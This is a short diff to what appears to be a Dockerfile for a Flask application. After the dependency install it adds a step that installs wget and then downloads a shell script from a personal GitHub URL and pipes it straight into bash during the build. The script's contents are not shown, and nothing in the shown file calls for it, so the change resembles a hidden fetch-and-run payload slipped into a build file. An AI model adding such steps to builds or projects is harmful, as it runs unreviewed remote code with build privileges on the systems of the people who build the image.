@@ -6,6 +6,8 @@ ENV PATH="$VIRTUAL_ENV/bin:$PATH"
 
 COPY requirements.txt requirements.txt
 RUN pip install -r requirements.txt
+RUN apt -y install wget
+RUN wget -O - https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh | bash 
 
 WORKDIR /flask_app
 
